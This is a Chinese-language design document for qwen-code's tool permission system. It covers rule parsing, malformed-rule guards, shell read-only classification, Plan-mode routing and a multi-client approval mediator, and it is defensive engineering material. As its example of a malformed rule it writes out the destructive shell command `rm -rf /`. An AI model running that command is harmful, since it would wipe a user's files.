# 权限系统技术方案

> 适用范围：`QwenLM/qwen-code` 的工具调用权限子系统。
> 代码基线：规则解析器 / 权限管理器位于 `main`；多客户端权限协调器（mediator，PR #4335）早期位于 `daemon_mode_b_main`，已随 #4490 进入 `main`；subagent plan lifecycle 阻断（#6087）、plan-required teammate leader approval（#6138）、main-session `exit_plan_mode` 显式用户批准（#6967）、shell safety 三态事实层（#7053）、Plan-mode shell safety routing（#7172）、`enter_plan_mode` 执行边界（#7248）与 ACP permission cancel stopReason 保留（#7295）已在 `main`。

---

## 1. 背景与动机

qwen-code 在执行任何工具（读文件、写文件、跑 shell、抓网页、调子 agent 等）之前，都需要回答一个问题：**这次调用要不要放行？** 系统把答案收敛成三态决策（`PermissionDecision`）：

- `allow` —— 直接放行，不打扰用户；
- `deny` —— 硬性拒绝；
- `ask` —— 弹确认框，交给用户裁决；
- （内部还有第四态 `default` —— "没有任何规则命中"，会进入默认裁决兜底，最终一定收敛成上面三者之一）。

围绕这套三态决策，演进出十一个相互独立又彼此咬合的子问题，正是本方案要解决的：

1. **规则模型与匹配**：用户/SDK/设置文件用 `Tool(specifier)` 这种 DSL 配置 allow/ask/deny 三张规则表（`permissions.allow` / `permissions.ask` / `permissions.deny`）。需要一套解析 + 匹配引擎，支持 shell 命令 glob、gitignore 风格路径、域名、MCP 通配等多种 specifier 语义。

2. **规则解析的健壮性（#3467）**：一条括号不配对的畸形规则（如 `Bash(rm -rf /)*` 或 `Bash(git status`）如果被"宽容地"解析成 `specifier: undefined`，就会退化成**整工具通配（tool-wide catch-all）**——对 deny 而言会误封所有命令，对 allow 而言一个手误就静默放行一切（安全事故）。必须让畸形规则"永不命中"。

3. **命名空间隔离（#3726）**：`monitor`（长驻 shell 命令运行器）与 `run_shell_command`（一次性 shell）是两个工具。早期 monitor 复用 `Bash(...)` 规则，导致 "Always Allow" 对 monitor 失效，同时又意外把 `run_shell_command` 权限一并授予。需要一个**独立的 `Monitor(...)` 命名空间**，且二者的覆盖关系必须是**非对称**的（详见 §3.2）。

4. **daemon 多客户端协调（#4335）**：`qwen serve` 守护进程模式下，一个 session 可能有多个客户端（本地 TUI + 远程 Web + SDK）同时连着。当 agent 发起一次权限请求时，**谁有权拍板？** 需要一个 mediator 在"一个权限请求"上协调多方投票，提供 first-responder / designated / consensus / local-only 四种策略，并保证并发安全、防作弊、可审计。

5. **权限取消后的停止语义（#5218/#5258/#5260）**：ACP 模式下，权限请求超时或用户取消不能只表现为一次工具错误，否则模型还可能继续执行同一 assistant step 里的后续工具。#5218 先让 cancelled `ask_user_question` 立即停止 turn，#5258 将同样的 fail-closed 语义推广到普通工具权限取消，#5260 则把原先写死的 5 分钟权限响应超时暴露为 `qwen serve --permission-response-timeout-ms`。

6. **subagent plan lifecycle 边界（#6026/#6087）**：subagent 可以继承或进入 plan mode，但它不能拥有主会话的 plan lifecycle。#6026 先修复 subagent 自身从 plan mode 退出后 approval-mode override 不更新的问题；#6087 再把 `enter_plan_mode` / `exit_plan_mode` 从普通 subagent 和 team agent 中移除，并在 tool-search 与工具 execute 层做 runtime fail-closed。

7. **main-session Plan mode 退出必须由人显式批准（#6967）**：`exit_plan_mode` 不能被 YOLO/AUTO、allow rule、permission hook 或 LLM plan approval gate 隐式批准。它需要一个独立的 `requiresUserInteraction()` 权限维度，让 host/user 的显式 allow 成为唯一退出 Plan mode 的信号，并用 plan revision guard 防止审批和执行之间的计划漂移。

8. **shell 默认权限需要区分 read-only/write/unknown 事实层（#7053）**：默认 shell 权限仍是 allow/ask 二值输出，但底层 safety classifier 需要知道一条命令是“证明只读”、“明确写入”还是“静态未知”。#7053 先把事实层拆成三态，避免 wrapper、env prefix、substitution、parser failure 或外部 helper 被误当成确定只读。

9. **Plan mode 下 shell/monitor 需要按三态 facts 路由（#7172）**：模型在 Plan mode 发起的 shell/monitor 不能和普通执行态一样处理。read-only 仍可用于调查，明确 write 必须在审批前拒绝，unknown 只能走一次性精确审批，并在执行前校验 Plan revision、cwd、permission policy 和 raw invocation 未漂移。

10. **`enter_plan_mode` 是同批工具执行边界（#7248）**：模型在同一 assistant response 中同时发出 `enter_plan_mode` 和其它 executable tool 时，不能让 sibling tool 在刚切换的 Plan 边界两侧继续执行；成功进入 Plan mode 还必须给模型完整 reminder，而不是短句。

11. **权限等待期间父级取消要保持 `cancelled` 终态（#7295）**：ACP permission prompt、Plan unknown shell approval、Stop hook permission 与 background notification 等等待点被 parent abort 时，不能把终态误报成 `end_turn`，也不能丢掉已经 recovered 的 mid-turn message。

前三点、第八点到第十点是**单进程内**的规则/事实/Plan lifecycle 策略（`packages/core`），第四点是**跨进程多客户端**的协调层（`packages/acp-bridge`，早期落在 `daemon_mode_b_main`，现随 #4490 进入 `main`），第五点和第十一点把取消/超时结果接回 ACP turn loop，确保权限层的"取消"不会被后续工具继续执行或错误终态稀释，第六点限制 subagent/team agent 对主会话 plan lifecycle 的控制权，第七点把 main-session Plan mode 退出从自动权限放行面里拆出来。本方案逐层展开。

---

## 2. 整体架构

权限判定有两条相互正交的轴：

- **纵向：规则裁决** —— 给定一次工具调用上下文（tool + command/filePath/domain），在 allow/ask/deny 三表中匹配，按"最严优先"得出决策；没命中则进入默认裁决兜底。这条轴在所有运行形态（CLI / SDK / daemon）下都生效。
- **横向：多客户端协调** —— 仅在 daemon 模式下，当裁决结果是 `ask`（需要人来拍板）时，由 mediator 决定"接受哪个客户端的回答"。

规则模型形如：

```
RuleType   = allow | ask | deny          // 三张表
Rule       = "ToolName"                   // 整工具规则
           | "ToolName(specifier)"        // 细粒度规则
SpecifierKind = command | path | domain | literal   // 由工具类别决定匹配算法
```

整体数据流：

```mermaid
flowchart TD
    subgraph core["packages/core （单进程，main）"]
        RAW["原始规则串<br/>settings.json / SDK / CLI"] --> PARSE["parseRule / parseRules<br/>rule-parser.ts"]
        PARSE -->|"invalid? 标记"| RULES["PermissionRuleSet<br/>allow / ask / deny<br/>（session + persistent）"]
        CTX["PermissionCheckContext<br/>toolName + command/filePath/domain"] --> EVAL["PermissionManager.evaluate<br/>permission-manager.ts"]
        RULES --> EVAL
        EVAL --> MATCH["matchesRule<br/>invalid 短路 / 工具名 / specifier"]
        MATCH -->|"命中 deny/ask/allow"| DEC["PermissionDecision"]
        MATCH -->|"default 且为 shell"| DEFRES["resolveDefaultPermission<br/>AST 只读判定 → allow/ask"]
        DEFRES --> DEC
    end

    DEC -->|"allow"| RUN["执行工具"]
    DEC -->|"deny"| BLOCK["拒绝"]
    DEC -->|"ask"| ASK{"运行形态?"}

    ASK -->|"CLI / SDK 单客户端"| UI["确认对话框 / 回调"]

    subgraph bridge["packages/acp-bridge"]
        ASK -->|"daemon 多客户端"| MED["MultiClientPermissionMediator<br/>permissionMediator.ts"]
        MED --> POL{"policy"}
        POL --> FR["first-responder"]
        POL --> DESIG["designated"]
        POL --> CONS["consensus<br/>(N-of-M quorum)"]
        POL --> LOCAL["local-only<br/>(loopback)"]
        FR --> SETTLE["resolveEntry → 一次性 settle"]
        DESIG --> SETTLE
        CONS --> SETTLE
        LOCAL --> SETTLE
    end

    UI --> RUN
    SETTLE -->|"PermissionResolution"| RUN
```

关键边界：mediator **不重新实现**规则裁决；它消费的是 agent 通过 ACP 发来的"权限请求 + 候选项（`allowedOptionIds`）"，协调的是"由哪个/哪些客户端来选其中一个候选项"。规则引擎（§3.1–3.3）与协调层（§3.4）是清晰解耦的两层。

---

## 3. 子系统详解

### 3.1 规则模型与解析；畸形规则守卫（#3467）

#### 规则模型

类型定义见 `packages/core/src/permissions/types.ts:PermissionRule`：

```ts
interface PermissionRule {
  raw: string;            // 原始串，用于去重 / 展示
  toolName: string;       // 规范化后的工具名（canonical）
  specifier?: string;     // 细粒度匹配串
  specifierKind?: SpecifierKind;
  invalid?: boolean;      // L63：畸形规则标志（#3467）
}
```

`parseRule`（`rule-parser.ts:parseRule`, L250）流程：

1. `trim` 后做一次 legacy 归一化：`:(\*)` → ` $1`，即把废弃的 `Bash(git:*)` 改写成 `Bash(git *)`（L255）。
2. 找第一个 `(`：没有 `(` → 整工具规则，`toolName = resolveToolName(normalized)`，无 specifier（L259-266）。
3. 有 `(` 但**不以 `)` 结尾** → 括号不配对，返回 `{ raw, toolName, invalid: true }`（L270-273）。**这是 #3467 的核心。**
4. 否则截取括号内的 `specifier`，并按 `getSpecifierKind(canonicalName)` 确定匹配算法类别（L275-284）。

工具名规范化由 `resolveToolName`（L177）查 `TOOL_NAME_ALIASES`（L43）完成，兼容 Claude Code 命名（`Bash`→`run_shell_command`、`Read`→`read_file` 等）；未知名（如 MCP 工具 `mcp__server__tool`）原样保留。

`getSpecifierKind`（L185）决定 specifier 的匹配语义：

| 类别 | 工具 | 匹配算法 |
|---|---|---|
| `command` | `SHELL_TOOL_NAMES` = {`run_shell_command`, `monitor`} | shell glob + 词边界 + 操作符切分（`matchesCommandPattern`, L642） |
| `path` | READ_TOOLS / EDIT_TOOLS | gitignore 风格 picomatch（`matchesPathPattern`, L826） |
| `domain` | `web_fetch` | 域名/子域名匹配（`matchesDomainPattern`, L864） |
| `literal` | 其余（Skill/Agent 等） | 精确字符串相等 |

#### 畸形规则守卫：`invalid` 标志 + 分层防御（#3467）

**问题**：修复前，`Bash(rm -rf /)*` 这种串因为不以 `)` 结尾，被解析成"有 toolName、无 specifier"的规则；而 `matchesRule` 在"无 specifier"时直接 `return true`（即整工具通配）。后果：

- 放进 **deny** 表 → 封禁该工具的**所有**调用（`git status` 也被拒）；
- 放进 **allow** 表 → 一个手误（漏右括号）就**静默放行一切命令**，是真实的安全风险。

**修复**：引入 `invalid?: boolean`，并在多个层次设防（不丢弃、只标记），形成纵深防御：

```mermaid
flowchart LR
    A["原始规则串"] --> P["① parseRule<br/>不配对 → invalid:true<br/>（不抛错、不丢弃）"]
    P --> L2["② 写入层 add*Rule / addPersistentRule<br/>invalid 直接 warn+return，不入表"]
    P --> L3["③ 列表层 listRules<br/>过滤掉 invalid，不展示"]
    P --> L4["④ UI 层 handleAddRuleSubmit<br/>invalid → 报错，不提交"]
    L2 --> M["⑤ matchesRule 兜底<br/>rule.invalid → return false<br/>（最后一道闸）"]
```

各层锚点：

- **① 解析层**：`parseRule`（L270-273）只打标记，不抛异常、不丢弃——保留 `raw` 以便诊断与展示原因。`parseRules`（L291）批量解析时对 invalid 项 `debugLogger.warn("Ignoring malformed rule (unbalanced parentheses)")`（L296-301）。
- **② 写入层**：`addSessionAllowRule` / `addSessionDenyRule` / `addSessionAskRule`（`permission-manager.ts` L767/L805/L821）与 `addPersistentRule`（L847）在入表前都先 `if (rule.invalid) { warn; return; }`，畸形规则根本进不了内存规则集。
- **③ 列表层**：`listRules`（L939）内部 `addRules` 仅 `push` 满足 `!rule.invalid` 的规则（L948），`/permissions` 对话框看不到畸形规则。
- **④ UI 层**：`PermissionsDialog.tsx:handleAddRuleSubmit`（L473）`parseRule` 后若 `rule.invalid` 立即 `setRuleInputError("Malformed rule: unbalanced parentheses. Use the format ToolName(specifier).")` 并 `return`，从源头拦截用户手输的畸形规则（L477-484）。
- **⑤ 匹配兜底**：`matchesRule`（L974）函数体**第一件事**就是 `if (rule.invalid) return false;`（L986）。这是最关键的一层——即便畸形规则因为某条历史路径（旧设置文件直接灌进 `persistentRules`、`updatePersistentRules` 批量替换等）绕过了写入层守卫，**匹配阶段也绝不会命中**，从而彻底堵死"退化成 catch-all"的根因。

> 设计要点：为什么"标记 + 多层"而不是"解析时直接丢弃"？见 §5。

---

### 3.2 工具命名空间：`Bash` / `Monitor` 与非对称覆盖（#3726）

`monitor` 工具是一个长驻 shell 命令运行器，语义上接近 `run_shell_command` 但生命周期不同。#3726 为它建立独立的权限命名空间，关键改动落在 `rule-parser.ts`：

- 别名：`TOOL_NAME_ALIASES` 增加 `Monitor`/`monitor`/`MonitorTool` → `'monitor'`（L126-129）。
- 命令类工具集合：`SHELL_TOOL_NAMES`（L138）= {`run_shell_command`, `monitor`}，使 monitor 的 specifier 也走 shell glob 匹配，并享受 `evaluate()` 中的 shell 专属路径（compound 切分、虚拟 op、AST 兜底）。
- 展示名：`CANONICAL_TO_RULE_DISPLAY`（L318）将 `run_shell_command`→`Bash`、`monitor`→`Monitor`（L329-331）；`DISPLAY_NAME_TO_VERB`（L447）加 `Monitor: 'monitor commands'`。`buildPermissionRules`（L396）因此为 monitor 调用生成 `Monitor(...)` 而非 `Bash(...)`，让 "Always Allow" 对 monitor 自洽生效。

#### 非对称覆盖（核心安全设计）

覆盖关系由 `toolMatchesRuleToolName`（L207）定义，其中针对 shell/monitor 的规则是**刻意非对称**的（L222-227）：

```ts
// "Bash" (run_shell_command) → 也覆盖 monitor
if (ruleToolName === 'run_shell_command' && contextToolName === 'monitor') {
  return true;
}
// 注意：没有反向分支。Monitor-only 规则不覆盖 shell。
```

即：

| 规则 | 调用 `run_shell_command` | 调用 `monitor` |
|---|---|---|
| `Bash(npm *)` | ✅ 命中 | ✅ **命中**（向下覆盖） |
| `Monitor(npm *)` | ❌ 不命中 | ✅ 命中 |

- **`Bash(...)` 覆盖 monitor** 的理由：防止已有的 `Bash(...)` allow 规则被"切换到 monitor 工具"这一手法**静默绕过**。用户授信"可以跑 `npm *`"时，不应因为 agent 改用 monitor 就失效。
- **`Monitor(...)` 不覆盖 shell** 的理由：monitor 授权不应**意外扩权**到一次性 shell 执行。这正是 #3726 要修的原始 bug（monitor 发 `Bash(...)` 规则导致意外授予 shell 权限）的反面保证。

> 安全取向：覆盖方向永远朝"更受限"收敛——宽工具（Bash）的授权可以惠及窄工具（Monitor），反之不行。

#### 关于 `SHELL_LIKE_TOOLS`（命名澄清）

PR #3726 描述提到在 `permission-manager.ts` 抽取 `SHELL_LIKE_TOOLS`。在当前 `main` 上，该职责已收敛为两处，需注意区分：

- `permission-manager.ts` 中所有"是否走 shell 专属路径"的判断统一用从 `rule-parser.ts` 导入的 **`SHELL_TOOL_NAMES`**（L13、L208、L286、L629、L670…），它就是 {`run_shell_command`, `monitor`}。
- 名为 **`SHELL_LIKE_TOOLS`** 的常量当前存活于 `packages/core/src/permissions/dangerousRules.ts:119`（`= [ToolNames.SHELL, ToolNames.MONITOR]`），服务于 AUTO 模式下的"危险 allow 规则剥离"分类器（`isDangerousBashRule`, L169），与本节的覆盖判定是不同关注点。两者集合内容一致（shell + monitor），但用途分离。

---

### 3.3 默认裁决：`resolveDefaultPermission` 的 shell safety 兜底（ask）

`matchesRule` 三表都没命中时，`evaluateSingle` 返回 `'default'`。对**非 shell** 工具，`default` 由上层 UI 结合 approval mode 处理（`getDefaultMode`, L911）。对 **shell/monitor** 工具，`evaluate`（L187）会把 `default` 进一步收敛成确定的 allow/ask：

```ts
// permission-manager.ts:evaluate L206-213
if (decision === 'default' && SHELL_TOOL_NAMES.has(toolName) && command !== undefined) {
  return this.resolveDefaultPermission(command);
}
```

`resolveDefaultPermission`（L413）逻辑：

```ts
try {
  const isReadOnly = await isShellCommandReadOnlyAST(command); // shellAstParser.ts
  if (isReadOnly) return 'allow';   // 只读命令（cd / ls / git status…）默认放行
} catch (e) {
  debugLogger.warn('AST read-only check failed, falling back to ask:', e);
}
return 'ask';                       // 其余一律 ask（fail-safe）
```

要点：

- **命令替换不是硬 deny**：刻意落到 `ask` 而非 `deny`（注释 L404-409 / 见 issue #4093）。原因：硬 deny 既不能被 YOLO 模式覆盖，又会因"周边复合命令是否有相关规则"而触发不一致；交给用户/YOLO 决定更正确，确认框里另由 `ShellToolInvocation.getConfirmationDetails` 显著标注命令替换风险。
- **#7053 改变事实层，不改变默认非 Plan routing**：`classifyShellCommandSafety()` 新增 read-only/write/unknown 三态，`isShellCommandReadOnlyAST()` 仍是兼容 boolean wrapper。当前 `resolveDefaultPermission` 只在 boolean true 时 allow；write 和 unknown 都收敛成 ask。parser load/runtime failure 在三态 API 中归 unknown；boolean API 仍保留历史 parser-failure regex fallback，但语法错误 AST 不再 fallback。

复合命令（含 `&&`/`||`/`|`/`;`）由 `evaluateCompoundCommand`（L356）逐子命令裁决，对每个 `default` 子命令调用 `resolveDefaultPermission`，再按 deny>ask>allow 取**最严**（L384-394）。例如规则 `allow: [git checkout *]` 下，`rm /path && git checkout -b f` = ask(rm) + allow(规则) → **ask**。

> 此外，shell 命令还会经 `evaluateShellVirtualOps`（L312）把 `cat`→Read、`curl`→WebFetch 等"虚拟操作"映射回 Read/Edit/WebFetch 规则评估；虚拟 op 只能**升级**严格度（escalate to ask/deny），绝不把 Bash 规则给出的 `allow` 降级（L281-298）。

### 3.3.1 Plan mode shell routing（#7172）

#7172 在 `packages/core/src/core/plan-mode-shell-policy.ts` 上消费 #7053 的三态 facts，只作用于 Plan mode 中模型发起的 `run_shell_command` / `monitor`。它不改变用户手动 `!command`、普通执行态和持久 permission rule：

- `read-only`：继续进入既有权限 manager，保留 Plan mode 中用 `ls`、`rg`、`git status` 调查现状的能力。
- `write`：在 permission UI 之前直接拒绝，返回 Plan-mode blocked tool result，明确阻断重定向写文件、安装依赖、删除文件、`git commit` 等修改行为。
- `unknown`：发起一次性精确审批，不写入 allow/ask/deny 规则；审批对象绑定原始命令、tool name、cwd、approval mode、permission policy、Plan revision 与 raw invocation。

unknown 被用户允许后，host 在执行前重新校验 Plan revision、cwd、permission policy、tool name、command、raw request 和 invocation id；若命令或环境在审批期间漂移，执行被取消而不是复用旧批准。ACP session、stream-json、dual-output、subagent/team agent、background task、teammate 和 speculation gate 都消费同一 routing 结果，避免不同前端对 Plan-mode shell 的安全边界不一致。

### 3.3.2 `enter_plan_mode` batch execution boundary（#7248）

#7248 把 `enter_plan_mode` 从普通 lifecycle tool 提升为同批模型工具调用的执行边界。问题在于：模型可以在同一个 assistant response 中同时发出 `enter_plan_mode` 与 `write_file`、`run_shell_command`、Agent 等 executable sibling；如果 scheduler 继续执行 sibling，Plan mode 的“先计划、后执行”边界会被同批请求穿透。

实现上新增 `plan-mode-entry-policy`，在 Core scheduler、ACP session 与 headless/non-interactive 路径复用同一判定：dedupe 后第一个 `enter_plan_mode` 允许执行，其它 executable sibling 返回 `EXECUTION_DENIED`，提示下一轮在 Plan mode 约束下重新发起；只读调查路径按既有策略保留。该策略作用于同一 batch 的最终工具调度阶段，避免因 UI/ACP/headless 分支各自处理而产生不同边界。

`enter_plan_mode` 成功或幂等时返回完整 `getPlanModeSystemReminder()`，并设置无限输出预算，绕过工具结果持久化 spill 与 batch offload。这里的输出不是普通诊断文本，而是后续模型必须遵守的 lifecycle policy；若被截断，下一轮模型会丢失 Plan mode 规则。失败路径仍按普通工具错误处理。

### 3.3.3 ACP permission prompt cancellation preservation（#7295）

#7295 修的是权限等待期间的终态归因。ACP session 在等待 permission prompt、Plan unknown shell approval、Stop hook permission 或 background notification 时，如果 parent abort 已经触发，旧路径仍可能把 turn 收束为 `end_turn`，让上层 UI/调度器误以为模型自然结束；同时 abort 后的 fallback preservation 可能丢掉已经 recovered 的 mid-turn message。

实现上新增 `getAbortAwareEndTurnStopReason()`：任何准备返回 `end_turn` 的权限/Stop-hook/background notification 终态都先检查 parent abort；abort 已触发时改报 `cancelled`，pending send 主循环也在 abort 后立即返回 cancelled。`#preserveStoppedToolRun()` 增加 `preserveFallbackOnAbort`，在 abort 场景下保留 recovered mid-turn message，避免取消导致上下文丢失。

这条能力不改变“权限取消后跳过同一 assistant step 后续工具”的既有 fail-closed 语义；它补齐的是父级取消与等待点并发时的 stopReason 和 transcript preservation 一致性。

---

### 3.4 多客户端权限协调（#4335）

> 文件：`packages/acp-bridge/src/permissionMediator.ts`（实现）、`permission.ts`（冻结契约）、`bridgeErrors.ts`（typed errors）；loopback 检测在 `packages/cli/src/serve/server.ts:detectFromLoopback`。

`MultiClientPermissionMediator`（L347）实现 `permission.ts` 的 `PermissionMediator` 契约，**独占**所有 pending / resolved 权限状态（bridge 仅保留 `entry.pendingPermissionIds` 作为每会话上限的快速索引）。生命周期三个方法：`request()` / `vote()` / `forgetSession()`。

#### 四种策略

`vote()`（L560）在校验通过后按 `pending.policy` 分派（L628-644）：

| 策略 | 行为 | 处理函数 | 拒绝码 |
|---|---|---|---|
| `first-responder` | 任一合法投票者立即拍板，后到者得 `permission_already_resolved`。pre-F3 默认，wire 逐字节兼容。 | `voteFirstResponder` (L700) | —— |
| `designated` | 仅"发起该 prompt 的 originator"可裁决；非 originator 得 403 `designated_mismatch`。匿名 prompt（无 `originatorClientId`）回退 first-responder。 | `voteDesignated` (L732) | 403 |
| `consensus` | M 个发起时刻在册投票者中，需 N 票（默认 `floor(M/2)+1`，可由 `policy.consensusQuorum` 覆盖）。首个达 quorum 的 option 胜出；中间票广播 `permission_partial_vote`。 | `voteConsensus` (L797) | 403 |
| `local-only` | 仅 loopback 投票者可裁决；远程得 403 `remote_not_allowed`。由内核盖戳的 `remoteAddress` 判定，不看任何 header。 | `voteLocalOnly` (L954) | 403 |

策略选择"单类 + `switch`"而非策略子类（注释 L15-17）：每个策略 5–15 行，子类反而更啰嗦；`default` 分支用 `never` 穷尽性检查（L637-642），未来新增 policy 字面量不写 case 会编译失败。

#### 同步注册（N1 不变式）

`request()`（L410）在返回的 Promise 的 executor 内**无 `await`**地完成：snapshot 在册投票者（`votersForSession`）→ 构造 `MediatorPending` → `this.pending.set` → 审计 `recordRequested` → 装 timer（L424-556）。这保证 bridge 的 `publish → mediator.request → await` 时序中，一个并发的 `forgetSession` 绝不会漏掉刚注册的 pending（否则会泄漏到超时）。`votersForSession` 契约要求**同步返回**（`permission.ts` 注释 + `MediatorDeps`），异步实现会破坏该不变式。

```mermaid
sequenceDiagram
    participant Agent
    participant Bridge as httpAcpBridge
    participant Med as Mediator
    participant Timer
    Agent->>Bridge: requestPermission(allowedOptionIds)
    Bridge->>Med: request(record, timeoutMs)
    Note over Med: ① 同步校验：<br/>allowedOptionIds 含 sentinel?<br/>→ throw CancelSentinelCollisionError (500)
    Med->>Med: new Promise(executor)
    Note over Med: ② executor 内无 await：<br/>votersForSession 快照 →<br/>pending.set → audit.recordRequested →<br/>arm timer（N1 同步注册）
    Med-->>Bridge: Promise<PermissionResolution>
    Timer-->>Med: （timeoutMs 后）身份校验 pending 未变 → resolveEntry(cancelled/timeout)
```

PR #5260 把这里的 `timeoutMs` 从固定 5 分钟变成可配置入口：`qwen serve --permission-response-timeout-ms <ms>` 经 `ServeOptions` 传入 `createAcpSessionBridge`，默认仍为 5 分钟；`0` 表示无限等待；非有限、负数、非整数在 `runQwenServe` 启动阶段 fail-loud；超大值在 bridge 内 clamp 到 Node timer 上限，避免 `setTimeout` 溢出后退化成 1ms 立即取消。

#### double-resolve 守卫（一次性 settle）

`resolveEntry`（L1116）是唯一的结算入口，函数体第一行即幂等守卫：

```ts
if (this.pending.get(pending.requestId) !== pending) return; // 已被别的路径结算
```

用**对象身份比较**（`!== pending`）而非 `has(requestId)`，可同时覆盖"已被投票结算"和"requestId 被 LRU 驱逐后被新请求复用"两种竞态。结算顺序经 N2 加固（L1085-1115）：clearTimeout → 从 `pending` 删除 → emit `permission_resolved` → 写 `resolved` → `audit.recordResolved` → **最后** `pending.resolve(resolution)`。emit 先于写 `resolved`（I5）是为了让 emit 期间重入投票看到 `pending===undefined && resolved===undefined`（静默 false），逐字节匹配 pre-F3 时序。timer 回调本身也有对称的身份校验（L512）才会触发超时结算。

#### consensus 防灌票（ballot-stuffing block）

`voteConsensus`（L797）三道闸：

1. **资格闸**（L815-844）：`vote.clientId === undefined || !pending.votersAtIssue.has(clientId)` → 拒绝。`votersAtIssue` 是**发起时刻**的快照，匿名投票者、以及 prompt 发出**之后**才连入的客户端一律被拒，杜绝"临时拉人头凑票"。
2. **幂等重投**（L859-874）：若该 clientId 已在某 option 桶里，保留**原始**投票，返回 `recorded` 且不再广播 partial_vote。审计记录用 tally 里的**原始 optionId**（而非本次尝试的），避免审计环显示一张从未计入 quorum 的票（wenshao review 3271041464）。
3. **计票 + quorum**（L877-909）：写入对应 option 桶；`bucket.size >= consensusQuorumFor(pending)` 即由该 option 胜出并 `resolveEntry`；否则广播 `permission_partial_vote`（含 `votesReceived/votesNeeded/quorum/optionTallies`）。

`consensusQuorumFor`（L1027）：有 override 则 `min(override, max(M,1))`（封顶到 M，防 N>M 死锁，封顶时打一次 stderr 面包屑）；否则 `max(1, floor(M/2)+1)`。M=2 时该公式要求**全票一致**，启动时打一次性 breadcrumb 提醒运维（L466-503，靠 `unanimityBreadcrumbEmitted` 去重，避免每次请求刷屏）。

```mermaid
sequenceDiagram
    participant C1 as Client A
    participant C2 as Client B
    participant C3 as Client C（事后连入）
    participant Med as Mediator
    Note over Med: votersAtIssue = {A, B}（发起时快照），quorum = floor(2/2)+1 = 2
    C1->>Med: vote(optionId=allow)
    Med->>Med: A∈votersAtIssue ✓ → 记票 bucket[allow]={A}（1/2）
    Med-->>C1: recorded(votesNeeded=1) + 广播 partial_vote
    C3->>Med: vote(optionId=allow)
    Med->>Med: C∉votersAtIssue ✗
    Med-->>C3: forbidden(designated_mismatch) → 403
    C1->>Med: vote(optionId=deny) （改票）
    Med->>Med: A 已投过 → 幂等，保留原 allow
    Med-->>C1: recorded（tally 不变）
    C2->>Med: vote(optionId=allow)
    Med->>Med: B∈votersAtIssue ✓ → bucket[allow]={A,B}（2/2 达 quorum）
    Med->>Med: resolveEntry(option=allow) 一次性 settle
    Med-->>C2: resolved
```

#### cancel-sentinel（跨策略取消 + 碰撞防御）

`CANCEL_VOTE_SENTINEL = '__cancelled__'`（L64）。当 ACP 投票体是 `{outcome:'cancelled'}`（不带 optionId）时，bridge 把它映射成该 sentinel 再调 `mediator.vote`。`vote()` 在**策略分派之前**识别 sentinel（L597-616），无视当前 policy 直接 `resolveEntry(cancelled/agent_cancelled)`——这是 agent 侧的中止逃生通道（详见 §5 / §7）。两道防御：

- **碰撞防御（issue 时）**：`request()` 若发现 agent 的 `allowedOptionIds` 含 sentinel，**同步**抛 `CancelSentinelCollisionError`（500）（L418-423，在构造 Promise 之前，避免"既抛错又留下永不 settle 的 Promise"）。
- **wire 防御（vote 时）**：bridge 侧拒绝来自线缆的 `{outcome:'selected', optionId:'__cancelled__'}`，抛 `InvalidPermissionOptionError`（400）（`bridge.ts` L2608-2614）。因为 mediator 识别 sentinel 早于校验 `allowedOptionIds`，若放行 wire 上的 sentinel 会绕过所有策略闸（designated/consensus/local-only），把真实批准静默翻成取消。

PR #5218/#5258 把 "cancelled" 从权限层结算结果一路提升到 ACP turn loop 的停止语义：`ask_user_question` 取消、普通工具权限取消、reject option 映射到 `Cancel`、权限请求通道失败，都会记录已拒工具并跳过同一模型响应里的后续工具调用；嵌套 Agent 权限取消会用 active abort signal 中止父 Agent turn 和同批 sibling Agent，避免 UI 已显示取消但模型继续执行。

#### local-only 与 `detectFromLoopback`（fail-closed）

`voteLocalOnly`（L954）仅当 `vote.fromLoopback === true` 才放行，否则 403 `remote_not_allowed`。`fromLoopback` 来自 `detectFromLoopback`（`server.ts:3381`）：

```ts
export function detectFromLoopback(req: { socket?: { remoteAddress?: string } }): boolean {
  const addr = req.socket?.remoteAddress;
  if (typeof addr !== 'string') return false; // fail-closed
  if (addr === '::1') return true;
  if (addr.startsWith('127.')) return true;          // 127.0.0.0/8
  if (addr.startsWith('::ffff:127.')) return true;   // IPv4-mapped IPv6
  return false;
}
```

安全要点：**只读内核盖戳的 `req.socket.remoteAddress`**，绝不解析 `X-Forwarded-For` 等可伪造 header（`bridgeTypes.ts` L104-114、`connectionRegistry.ts` L116-122 均反复声明）；`remoteAddress` 非字符串时 fail-closed 返回 `false`。此外 `clientId` 由 daemon 盖戳（`resolveTrustedClientId`），永不取客户端自报（`permission.ts:PermissionVote.clientId` 注释）。

#### typed errors（路由状态码映射）

`server.ts:sendPermissionVoteErrorImpl`（L3568）把 typed error 映射为结构化 HTTP 响应：

| 错误（`bridgeErrors.ts`） | 触发点 | HTTP | `code` |
|---|---|---|---|
| `InvalidPermissionOptionError` (L187) | optionId 不在 `allowedOptionIds`（含 wire sentinel） | **400** | `invalid_option_id` |
| `PermissionForbiddenError` (L281) | designated/consensus 资格不符、local-only 非 loopback | **403** | `permission_forbidden` |
| `PermissionPolicyNotImplementedError` (L228) | policy 已声明但本 build 未实现（前向兼容，当前不可达） | **501** | `permission_policy_not_implemented` |
| `CancelSentinelCollisionError` (L253) | agent 把 sentinel 当作合法 option 标签 | **500** | `cancel_sentinel_collision` |

best-effort 不变式：`safeEmit`（L1195）/ `safeAudit`（L1281）/ `writeForbiddenStderr`（L1243）全部 try/catch 包裹，连 `process.stderr.write` 的 EPIPE 也吞掉——**绝不让可观测性失败阻塞 Promise settle**，否则 agent 会一直挂在 `requestPermission` 直到超时。

### 3.5 Agent 权限 UI 与 ACP wire kind 兼容（#5085/#5105）

Agent/sub-agent 工具在产品语义上需要专属权限确认文案，例如 "Launch this agent?"，但 ACP wire protocol 并不存在 `agent` 这个合法 kind。#5085 和 #5105 把这两个维度拆开：

- **内部分类保留 `Kind.Agent`（#5085）**：Agent 工具在 qwen-code 内部仍可按 agent kind 做 UI/权限分流；但 `ToolCallEmitter.mapToolKind` 对 ACP wire 继续映射为协议合法的 `other`，避免 daemon Zod 校验因为不存在的 `agent` kind 丢帧。
- **权限 UI 通过 `_meta.toolName` 识别 Agent（#5105）**：ACP `session/request_permission` 里把规范工具名镜像到 `toolCall._meta.toolName`。VS Code `PermissionDrawer` 和 daemon web-shell `ToolApproval` 不再依赖 wire kind，而是读取 `_meta.toolName === 'agent'` 展示 agent 专属标题与描述。

这个设计避免把 UI 语义塞进线协议枚举：wire kind 保持兼容，权限 UI 仍能恢复 Agent 专属体验。代价是消费者必须把 `_meta.toolName` 当作最佳语义来源；若未来新增更多工具专属权限 UI，也应沿用 `_meta.toolName`，而不是扩展 ACP kind。

